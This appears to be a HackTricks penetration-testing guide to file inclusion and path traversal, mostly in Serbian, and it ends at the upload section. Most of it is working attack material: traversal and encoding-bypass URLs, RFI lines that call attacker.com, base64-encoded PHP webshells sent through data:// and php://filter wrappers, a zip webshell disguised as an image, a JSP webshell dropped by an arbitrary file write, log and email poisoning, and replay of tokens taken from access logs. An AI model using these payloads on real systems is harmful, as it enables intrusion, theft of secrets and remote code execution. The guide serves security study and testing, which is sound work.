# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Fajl se učitava sa udaljenog servera (najbolje: možete napisati kod i server će ga izvršiti). U php ovo je **onemogućeno** po defaultu (**allow_url_include**).\
**Local File Inclusion (LFI):** Server učitava lokalni fajl.

Ranljivost se javlja kada korisnik na neki način može kontrolisati fajl koji će server učitati.

Ranljive **PHP functions**: require, require_once, include, include_once

Zanimljiv alat za iskorišćavanje ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Kombinovanjem nekoliko \*nix LFI listi i dodavanjem više putanja napravio sam ovu:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pokušajte i da zamenite `/` sa `\`\
Pokušajte i da dodate `../../../../../`

Lista koja koristi više tehnika da pronađe fajl /etc/password (da biste proverili da li ranjivost postoji) može se naći [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje različitih wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pokušajte i da zamenite `/` sa `\`\
Pokušajte i da uklonite `C:/` i dodate `../../../../../`

Lista koja koristi više tehnika da pronađe fajl /boot.ini (da biste proverili da li ranjivost postoji) može se naći [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za linux.

## Osnovni LFI i obilaženja

Svi primeri su za Local File Inclusion ali se mogu primeniti i na Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences uklonjene nerekurzivno
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodavanja više karaktera na kraj prosleđenog stringa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ово је **решено од PHP 5.4**

### **Кодирање**

Можете користити нестандардна кодирања као што је double URL encode (и друга):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### HTML-to-PDF SVG/IMG path traversal

Moderni HTML-to-PDF engine-i (npr. **TCPDF** ili wrapper-i poput **html2pdf**) rado parsiraju attacker-provided HTML, SVG, CSS i font URL-ove, a istovremeno se pokreću unutar poverljivih backend mreža sa pristupom fajl-sistemu. Ako možete da injektujete HTML u `$pdf->writeHTML()`/`Html2Pdf::writeHTML()`, često možete exfiltrate lokalne fajlove koje nalog web servera može da pročita.

- **Fingerprint the renderer**: svaki generisani PDF sadrži `Producer` polje (npr. `TCPDF 6.8.2`). Poznavanje tačnog build-a govori koji path filteri postoje i da li se URL decoding vrši pre validacije.
- **Inline SVG payloads**: `TCPDF::startSVGElementHandler()` čita `xlink:href` atribut iz `<image>` elemenata pre nego što pozove `urldecode()`. Ugradnja malicioznog SVG-a unutar data URI čini da mnogi HTML sanitizatori ignorišu payload dok ga TCPDF i dalje parsira:
```
<img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSB4bGluazpocmVmPSIuLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz48L3N2Zz4=" />
```
TCPDF prepends `$_SERVER['DOCUMENT_ROOT']` to paths beginning with `/` and only later resolves `..`, so use either leading `../../..` segments or `/../../..` to escape the root after the prepend.

- **Encoding to bypass naive filters**: Verzije ≤6.8.2 proveravaju samo literalni podniz `../` *pre* dekodiranja URL-a. Slanjem `..%2f` (ili `..%2F`) u SVG-u ili u sirovom `<img src>` atributu zaobilazi se provera, jer se sekvenca za traversal `../` rekonstruiše tek nakon što TCPDF pozove `urldecode()`.
- **Double-encoding for multi-stage decoding**: Ako se korisnički unos dekodira od strane web framework-a *i* od strane TCPDF-a, dvostruko enkoduj kosu crtu (`%252f`). Jedno dekodiranje pretvoriće je u `%2f`, drugo dekodiranje u TCPDF-u u `/`, što daje `/..%252f..` → `/../../../…` bez ikada prikazivanja `../` ranom filtru.
- **HTML `<img>` handler**: `TCPDF::openHTMLTagHandler()` sadrži istu grešku u redosledu operacija, omogućavajući direktne HTML payload-e kao što je `src="%2f..%252f..%252ftmp%252fsecret.png"` da pročitaju bilo koju lokalno dostupnu bitmapu.

Ova tehnika leaks bilo šta što PDF worker može pročitati (scanovi pasoša, API ključevi prikazani kao slike, itd.). Zakrpe su to ispravile u 6.9.1 canonicalizovanjem putanja (`isRelativePath()`), pa tokom testiranja prioritizujte starije `Producer` verzije.

### Iz postojeće fascikle

Možda back-end proverava putanju foldera:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istraživanje direktorijuma fajl sistema na serveru

Fajl sistem na serveru može se rekurzivno istražiti kako bi se identifikovali direktorijumi, ne samo fajlovi, primenom određenih tehnika. Ovaj proces podrazumeva određivanje dubine direktorijuma i ispitivanje postojanja određenih foldera. Ispod je detaljna metoda za to:

1. **Odredite dubinu direktorijuma:** Utvrdite dubinu trenutnog direktorijuma tako što uspešno dohvatite `/etc/passwd` fajl (primenljivo ako je server zasnovan na Linux-u). Primer URL-a može biti strukturisan na sledeći način, što ukazuje na dubinu tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Ispitajte foldere:** Dodajte ime sumnjivog foldera (npr., `private`) u URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje dubine za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tumačenje rezultata:** Odgovor servera ukazuje da li direktorijum postoji:
- **Greška / Nema izlaza:** Direktorijum `private` verovatno ne postoji na naznačenoj lokaciji.
- **Sadržaj `/etc/passwd`:** Prisutnost direktorijuma `private` je potvrđena.
4. **Rekurzivno istraživanje:** Otkriveni direktorijumi se mogu dalje ispitivati za poddirektorijume ili fajlove koristeći istu tehniku ili tradicionalne Local File Inclusion (LFI) metode.

Za istraživanje direktorijuma na drugim lokacijama u fajl sistemu, prilagodite payload u skladu s tim. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pretpostavljajući da je trenutni direktorijum na dubini 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation je metoda koja se koristi za manipulaciju putanjama fajlova u web aplikacijama. Često se koristi za pristup ograničenim fajlovima zaobilaženjem određenih bezbednosnih mera koje dodaju dodatne karaktere na kraj putanja fajlova. Cilj je kreirati putanju fajla koja će, nakon što je bezbednosna mera izmeni, i dalje ukazivati na željeni fajl.

U PHP-u, različite reprezentacije putanje fajla mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` se svi tretiraju kao ista putanja.
- Kada poslednjih 6 karaktera čine `passwd`, dodavanje `/` (tako da bude `passwd/`) ne menja ciljani fajl.
- Slično, ako je na putanju dodat `.php` (npr. `shellcode.php`), dodavanje `/.` na kraj neće promeniti fajl kojem se pristupa.

Priloženi primeri pokazuju kako iskoristiti path truncation za pristup `/etc/passwd`, čestom cilju zbog osetljivog sadržaja (informacije o korisničkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih traversals može biti oko 2027, ali taj broj može varirati u zavisnosti od konfiguracije servera.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) u kombinaciji sa dodatnim dot segmentima i karakterima mogu se koristiti za navigaciju fajl sistemom, efektivno ignorišući dodatne stringove koje server pridodaje.
- **Determining the Required Number of Traversals**: Kroz pokušaj i grešku može se pronaći tačan broj `../` sekvenci potreban da se dođe do root direktorijuma, a zatim do `/etc/passwd`, obezbeđujući da su svi dodati stringovi (kao `.php`) neutralisani dok željeni put (`/etc/passwd`) ostane netaknut.
- **Starting with a Fake Directory**: Uobičajena praksa je započeti put sa nepostojećim direktorijumom (npr. `a/`). Ova tehnika se koristi kao mera predostrožnosti ili da bi se ispunili zahtevi serverove logike parsiranja puta.

Prilikom korišćenja path truncation tehnika, ključno je razumeti ponašanje parsiranja puta na serveru i strukturu fajl sistema. Svaki scenarij može zahtevati drugačiji pristup, i često je potrebno testiranje da bi se pronašla najefikasnija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo podrazumevano onemogućeno jer je **`allow_url_include`** **Off.** Mora biti **On** da bi radilo, i u tom slučaju možete uključiti PHP fajl sa vašeg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako je iz nekog razloga **`allow_url_include`** **On**, ali PHP **filtrira** pristup eksternim web-stranama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete, na primer, koristiti data protokol sa base64 da dekodirate b64 PHP kod i dođete do RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> U prethodnom kodu, završni `+.txt` je dodat zato što je napadaču bio potreban string koji se završava sa `.txt`, pa se string završava time i nakon b64 decode taj deo će vratiti samo smeće, a pravi PHP code će biti uključen (i samim tim izvršen).

Još jedan primer **koji ne koristi `php://` protocol** bi bio:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python korenski element

U Pythonu, u kodu poput ovog:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **absolute path** u **`file_name`**, **prethodna putanja se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Ovo je predviđeno ponašanje u skladu sa [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od apsolutne komponente putanje.

## Java Listanje direktorijuma

Izgleda da, ako imate Path Traversal u Java i **zatražite direktorijum** umesto fajla, biće vraćen **listing direktorijuma**. Ovo se, koliko ja znam, neće dešavati u drugim jezicima.

## Top 25 parameters

Evo liste top 25 parametara koji bi mogli biti ranjivi na local file inclusion (LFI) (iz [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI koristeći PHP wrappers & protocols

### php://filter

PHP filters omogućavaju izvođenje osnovnih **operacija izmene nad podacima** pre nego što budu pročitani ili zapisani. Postoji 5 kategorija filtera:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Uklanja tagove iz podataka (sve između znakova "<" i ">")
- Napomena: ovaj filter je uklonjen u novijim verzijama PHP-a
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Pretvara u drugo kodiranje (`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih kodiranja** koje su podržane pokrenite u konzoli: `iconv -l`

> [!WARNING]
> Zloupotrebom `convert.iconv.*` conversion filtera možete **generisati proizvoljan tekst**, što može biti korisno za upisivanje proizvoljnog teksta ili da funkcija poput include obradi proizvoljan tekst. Za više informacija pogledajte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Kompresuje sadržaj (korisno ako exfiltrating puno informacija)
- `zlib.inflate`: Dekompresuje podatke
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Zastarelo
- `mdecrypt.*` : Zastarelo
- Other Filters
- Pokretanjem u PHP-u `var_dump(stream_get_filters());` možete pronaći par **neočekivanih filtera**:
- `consumed`
- `dechunk`: poništava HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Deo "php://filter" nije osetljiv na velika i mala slova

### Korišćenje php filters kao oracle za čitanje proizvoljnih fajlova

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) je predložena tehnika za čitanje lokalnog fajla bez da server vrati sadržaj. Tehnika se zasniva na **boolean eksfiltraciji fajla (char po char) koristeći php filters** kao oracle. To je zato što php filters mogu da se koriste da tekst postane dovoljno veliki da php baci izuzetak.

U originalnom postu nalazi se detaljno objašnjenje tehnike, ali ovde je kratak sažetak:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- Ovo će se koristiti da se generiše **tekst toliko velik kada je početno slovo pogođeno tačno** da php pokrene **grešku**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- Ovo, u kombinaciji sa prethodnim (i drugim filterima zavisno od pogođenog slova), će nam omogućiti da pogodimo slovo na početku teksta posmatrajući kada uradimo dovoljno transformacija da ono prestane da bude heksadecimalni karakter. Jer ako je hex, dechunk ga neće obrisati i početna bomba će izazvati php grešku.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Korišćenjem drugih transformacija poput **rot13** na početku moguće je leak-ovati druge karaktere kao n, o, p, q, r (i drugi codeci se mogu koristiti da premeste druga slova u hex opseg).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- Krajnji problem je videti **how to leak more than the initial letter**. Korišćenjem order memory filtera kao što su **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** moguće je promeniti redosled karaktera i dovesti na prvo mesto druga slova iz teksta.
- I da bi mogli dobiti **further data** ideja je da se **generišu 2 bytes of junk data at the beginning** sa **convert.iconv.UTF16.UTF16**, primeni **UCS-4LE** da se oni **pivot with the next 2 bytes**, i o**brišite podatke dok ne dođete do junk podataka** (ovo će ukloniti prva 2 bajta početnog teksta). Nastavite ovako dok ne dođete do željenog bita za leak.

U postu je takođe leaked alat za automatsko izvođenje: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ovaj wrapper omogućava pristup deskriptorima fajlova koje proces ima otvorene. Potencijalno korisno za eksfiltraciju sadržaja otvorenih fajlova:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Takođe možete koristiti **php://stdin, php://stdout and php://stderr** da pristupite **file descriptors 0, 1 and 2** redom (nisam siguran kako bi ovo moglo biti korisno u napadu)

### zip:// and rar://

Otpremite Zip ili Rar fajl sa PHPShell-om unutra i pristupite mu.\
Da biste mogli zloupotrebiti rar protocol, on **mora biti posebno aktiviran**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Imajte na umu da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Možete execute code koristeći ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Datoteka `.phar` može se iskoristiti za izvršavanje PHP koda kada web aplikacija koristi funkcije kao što je `include` za učitavanje fajlova. Sledeći PHP kod prikazuje kreiranje `.phar` datoteke:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Za kompilaciju `.phar` fajla treba izvršiti sledeću komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Prilikom izvršavanja, biće kreiran fajl nazvan `test.phar`, koji bi potencijalno mogao biti iskorišćen za eksploataciju Local File Inclusion (LFI) ranjivosti.

U slučajevima kada LFI samo čita fajl bez izvršavanja PHP koda u njemu, preko funkcija kao što su `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ili `filesize()`, može se pokušati eksploatisanje ranjivosti deserializacije. Ova ranjivost je povezana sa čitanjem fajlova korišćenjem `phar` protokola.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Bilo je moguće zloupotrebiti **any arbitrary file read from PHP that supports php filters** da se dobije RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Vrlo kratak rezime: **3 byte overflow** u PHP heap-u je zloupotrebljen da **alter the chain of free chunks** specifične veličine kako bi bilo moguće **write anything in any address**, pa je dodat hook koji poziva **`system`**.\
Bilo je moguće alocirati chunks specifičnih veličina zloupotrebom dodatnih php filtera.

### More protocols

Pogledajte još moguće[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Upis u memoriju ili u privremeni fajl (nisam siguran kako bi ovo moglo biti korisno u file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Pristup lokalnom fajl sistemu
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Pristup HTTP(s) URL-ovima
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Pristup FTP(s) URL-ovima
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompresioni streamovi
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Pronalazi putanje koje odgovaraju obrascu (Ne vraća ništa štampano, tako da ovde nije baš korisno)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streamovi (Nije korisno za čitanje proizvoljnih fajlova)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) rizici u PHP-u su posebno veliki kada se radi sa funkcijom 'assert', koja može izvršavati kod sadržan u stringovima. To je posebno problematično ako se ulaz koji sadrži znakove za directory traversal poput ".." proverava, ali nije pravilno sanitizovan.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Iako je ovo namenjeno da spreči traversal, to nenamerno stvara vektor za code injection. Da bi se ovo iskoristilo za čitanje sadržaja fajla, napadač bi mogao da koristi:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Slično, za izvršavanje proizvoljnih sistemskih komandi, može se koristiti:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ova tehnika je relevantna u slučajevima kada vi **kontrolišete** **putanju fajla** koju koristi **PHP funkcija** koja će **pristupiti fajlu**, ali nećete videti sadržaj fajla (npr. jednostavan poziv **`file()`**) jer sadržaj nije prikazan.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Kao rezime, tehnika koristi **"UCS-4LE" encoding** da bi sadržaj fajla bio toliko **velik** da će **PHP funkcija koja otvara fajl** izazvati **grešku**.

Zatim, da bi se leak-ovao prvi char, filter **`dechunk`** se koristi zajedno sa drugim kao što su **base64** ili **rot13**, i na kraju filteri **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** se koriste da postave druge chars na početak i leak-ju ih.

**Funkcije koje mogu biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Kada kod na serveru koji prihvata/otpremi fajlove gradi destinacioni path koristeći user-controlled data (npr. filename ili URL) bez canonicalising i validacije, `..` segmenti i absolute paths mogu pobeći iz predviđenog direktorijuma i prouzrokovati arbitrary file write. Ako možete smestiti payload u web-exposed direktorijum, obično dobijate unauthenticated RCE tako što otpremite webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Ojačavanje koje poništava ovu klasu grešaka:
- Resolvirajte do kanonske putanje i osigurajte da je potomak dozvoljenog osnovnog direktorijuma.
- Odbacite svaku putanju koja sadrži `..`, apsolutne korene, ili slova drajva; preferirajte generisane nazive fajlova.
- Pokrećite writer kao nalog sa niskim privilegijama i odvojite direktorijume za pisanje od servirane root putanje.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Ako je Apache ili Nginx server **ranjiv na LFI** unutar include funkcije možete pokušati da pristupite **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, ubacite u **user agent** ili u **GET parameter** php shell poput **`<?php system($_GET['c']); ?>`** i uključite taj fajl

> [!WARNING]
> Imajte na umu da **ako koristite dvostruke navodnike** za shell umesto **jednostrukih navodnika**, dvostruki navodnici će biti modifikovani za string "_**quote;**_", **PHP će baciti grešku** i **ništa drugo neće biti izvršeno**.
>
> Takođe, uverite se da **ispravno napišete payload** ili će PHP prijavljivati grešku svaki put kad pokuša da učita log fajl i nećete imati drugu priliku.

Ovo se može uraditi i u drugim logovima, ali **budite oprezni,** kod unutar logova može biti URL encoded i to može uništiti Shell. Header **authorisation "basic"** sadrži "user:password" u Base64 i on se dekodira unutar logova. PHPShell može biti ubačen u ovaj header.\
Drugi mogući putevi do log fajlova:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Čitanje access logs da biste prikupili GET-based auth tokens (token replay)

Mnoge aplikacije greškom prihvataju session/auth tokens putem GET-a (npr. AuthenticationToken, token, sid). Ako imate path traversal/LFI primitive koji omogućavaju pristup web server access logu, možete ukrasti te tokene iz access logs i replay-ovati ih da potpuno zaobiđete autentikaciju.

How-to:
- Use the traversal/LFI to read the web server access log. Common locations:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Some endpoints return file reads Base64-encoded. If so, decode locally and inspect the log lines.
- Grep for GET requests that include a token parameter and capture its value, then replay it against the application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Dekodirajte telo ako je Base64, zatim reprodukujte uhvaćeni token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Napomene:
- Tokens in URLs se podrazumevano loguju; nikada ne prihvatajte bearer tokens putem GET u produkcionim sistemima.
- Ako aplikacija podržava više imena tokena, tražite uobičajene ključeve kao AuthenticationToken, token, sid, access_token.
- Promenite sve tokene koji su možda leaked u logovima.

### Putem Emaila

**Pošaljite mail** na interni nalog (user@localhost) koji sadrži vaš PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da include-ujete fajl mejla korisnika sa putanjom kao **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Putem /proc/*/fd/*

1. Uploadujte veliki broj shells (na primer: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), pri čemu je $PID PID procesa (može se brute-forcati) i $FD je file descriptor (takođe se može brute-forcati)

### Putem /proc/self/environ

Kao kod log fajla, pošaljite payload u User-Agent; biće reflektovano unutar fajla /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Putem otpremanja

